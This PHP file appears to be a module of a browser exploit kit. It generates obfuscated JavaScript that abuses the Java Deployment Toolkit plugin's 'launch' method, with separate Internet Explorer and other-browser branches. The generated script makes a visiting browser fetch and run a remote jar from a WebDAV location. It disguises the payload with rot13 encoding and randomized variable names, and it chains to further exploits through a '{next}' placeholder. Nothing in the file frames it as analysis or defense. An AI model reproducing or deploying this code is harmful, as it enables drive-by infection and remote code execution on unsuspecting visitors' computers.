<?php 
include("webdav.php");
$randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
$strUrl = $GLOBALS["cpXplHelper"]->GetURL("webstart", $browser, $os, "webstart");
$functionName = $ExploitFunctions[4];
$code = "http: -J-jar -J" . base64_decode($webdav) . " " . $strUrl . " none";
if( $browser == "ie" ) 
{
    $eArray[] = "\r\nfunction " . $functionName . "(){\r\n\tif (navigator.javaEnabled()) {\r\n\t\tvar " . $randVar[0] . " = " . $ExploitFunctions[52] . "(" . rot13enc($code) . ");\r\n\t\ttry {\r\n\t\t\r\n\t\t\tvar " . $randVar[1] . " = document.createElement(" . $ExploitFunctions[52] . "(" . rot13enc("OBJECT") . "));\r\n\t\t\t" . $randVar[1] . ".classid = " . $ExploitFunctions[52] . "(" . rot13enc("clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA") . ");\r\n\t\t\t" . $randVar[1] . "[" . $ExploitFunctions[52] . "(" . rot13enc("launch") . ")](" . $randVar[0] . ");\r\n\t\t}catch(e){\r\n\t\t\ttry {\r\n\t\t\t\tvar " . $randVar[2] . " = document.createElement(" . $ExploitFunctions[52] . "(" . rot13enc("OBJECT") . "));\r\n\t\t\t\t" . $randVar[2] . ".classid = " . $ExploitFunctions[52] . "(" . rot13enc("clsid:clsid:8AD9C840-044E-11D1-B3E9-00805F499D93") . ");\r\n\t\t\t\t" . $randVar[2] . "[" . $ExploitFunctions[52] . "(" . rot13enc("launch") . ")](" . $randVar[0] . ");\r\n\t\t\t}catch(e){}\r\n\t\t}\r\n\t\tsetTimeout(\"{next}\", 1500);\r\n\t}\r\n\t{next}\r\n}\r\n";
}
else
{
    $eArray[] = "\r\nfunction " . $functionName . "(){\r\n\tif (navigator.javaEnabled()) {\r\n\t\tvar " . $randVar[0] . " = " . $ExploitFunctions[52] . "(" . rot13enc($code) . ");\r\n\t\ttry {\r\n\t\t\tvar " . $randVar[3] . " = document.createElement(" . $ExploitFunctions[52] . "(" . rot13enc("OBJECT") . "));\r\n\t\t\t" . $randVar[3] . ".type = " . $ExploitFunctions[52] . "(" . rot13enc("application/java-deployment-toolkit") . ");\r\n\t\t\tdocument.body.appendChild(" . $randVar[3] . ");\r\n\t\t\t" . $randVar[3] . "[" . $ExploitFunctions[52] . "(" . rot13enc("launch") . ")](" . $randVar[0] . ");\r\n\t\t} catch (e) {\r\n\t\t\ttry {\r\n\t\t\tvar " . $randVar[2] . " = document.createElement(" . $ExploitFunctions[52] . "(" . rot13enc("OBJECT") . "));\r\n\t\t\t" . $randVar[2] . ".type = " . $ExploitFunctions[52] . "(" . rot13enc("application/npruntime-scriptable-plugin;deploymenttoolkit") . ");\r\n\t\t\tdocument.body.appendChild(" . $randVar[2] . ");\r\n\t\t\t" . $randVar[2] . "[" . $ExploitFunctions[52] . "(" . rot13enc("launch") . ")](" . $randVar[0] . ");\r\n\t\t\t}catch(e){}\r\n\t\t}\r\n\t\tsetTimeout(\"{next}\", 1500);\r\n\t\treturn;\r\n\t}\r\n\t{next}\r\n}";
}

echo "\r\n";

